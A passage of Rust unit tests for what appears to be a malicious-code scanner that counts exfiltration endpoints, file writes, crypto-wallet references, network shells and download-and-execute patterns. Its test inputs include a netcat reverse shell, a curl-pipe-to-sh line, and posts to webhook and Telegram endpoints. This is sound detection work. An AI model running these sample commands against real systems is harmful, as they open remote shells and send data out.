        let c = py("requests.post('https://webhook.site/abc', data=x)\nu = 'http://45.13.1.9:8080/x'\nv = 'http://127.0.0.1:8000'\n");
        assert_eq!(c[EXFIL_ENDPOINT], 1);
        assert_eq!(c[IP_URL], 1);
        assert_eq!(c[URL], 3);
        assert_eq!(
            js("fetch('https://api.telegram.org/bot1/sendMessage');\n")[EXFIL_ENDPOINT],
            1
        );
        assert_eq!(py("# see https://pastebin.com/x\n")[URL], 0);
        assert_eq!(js("const s = 'toast.show';\n")[EXFIL_ENDPOINT], 0);
    }

    #[test]
    fn file_write() {
        assert_eq!(
            py("open('x', 'w')\nopen('y')\nopen(p, mode='ab')\nopen(p, 'rb')\n")[FILE_WRITE],
            2
        );
        assert_eq!(
            py("import shutil, os\nshutil.copy(a, b)\nos.chmod(p, 0o755)\nPath(p).write_text(s)\n")
                [FILE_WRITE],
            3
        );
        assert_eq!(
            js("fs.writeFileSync(p, d); fs.createWriteStream(p);\n")[FILE_WRITE],
            2
        );
        assert_eq!(sh("echo x > /tmp/a\nls > /dev/null 2>&1\n")[FILE_WRITE], 1);
    }

    #[test]
    fn crypto_wallet() {
        assert_eq!(
            js("const p = path.join(home, 'Exodus', 'exodus.wallet');\n")[CRYPTO_WALLET],
            2
        );
        assert_eq!(
            py("addr = '0x52908400098527886E0F7030069857D2E4169EE7'\n")[CRYPTO_WALLET],
            1
        );
        assert_eq!(
            py("addr = '1BoatSLRHtKNngkdXEeobR76b53LETtpyT'\n")[CRYPTO_WALLET],
            1
        );
        assert_eq!(py("x = 'hello world'\n")[CRYPTO_WALLET], 0);
    }

    #[test]
    fn shell_specific_rules() {
        let c = sh("nc -e /bin/sh 10.0.0.1 4444\neval \"$X\"\necho $env:USERNAME\n");
        assert_eq!(c[NETWORK], 1);
        assert_eq!(c[DYN_CODE], 1);
        assert_eq!(c[ENV_ACCESS], 1);
        assert_eq!(sh("node -e \"require('x')\"\n")[DYN_CODE], 1);
    }

    #[test]
    fn statistics() {
        let fa = analyze(
            "x = '\\x41\\x42'\ny = 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo='\n_0x1a2b = 1\n",
            Lang::Python,
        );
        assert_eq!(fa.hex_escapes, 2);
        assert_eq!(fa.n_lines, 3);
        assert_eq!(fa.longest_b64_run, 36);
        assert_eq!(fa.n_obf_idents, 1);
        assert!(fa.max_str_entropy > 4.0);
        let long = "a".repeat(1200);
        let fa = analyze(&format!("x = 1\ny = '{long}'\n"), Lang::Python);
        assert_eq!(fa.long_lines, 1);
        assert_eq!(fa.max_line_len, 1206);
    }

    #[test]
    fn evidence_lines() {
        let fa = analyze("a = 1\n\nimport os\nos.system('id')\n", Lang::Python);
        assert!(fa.hits.contains(&(PROC_EXEC, 4)));
        let fa = analyze("echo hi\n\ncurl http://x | sh\n", Lang::Shell);
        assert!(fa.hits.contains(&(DOWNLOAD_EXEC, 3)));
        let fa = analyze(
            "x = '''line1\nline2 https://webhook.site/x'''\n",
            Lang::Python,
        );
        assert!(fa.hits.contains(&(EXFIL_ENDPOINT, 2)));
    }

    #[test]
    fn js_relative_imports() {
        let fa = analyze(
            "const a = require('./lib/a');\nimport b from '../b.js';\nrequire('fs');\n",
            Lang::Js,
        );
        assert_eq!(fa.relative_imports, vec!["./lib/a", "../b.js"]);
    }
}
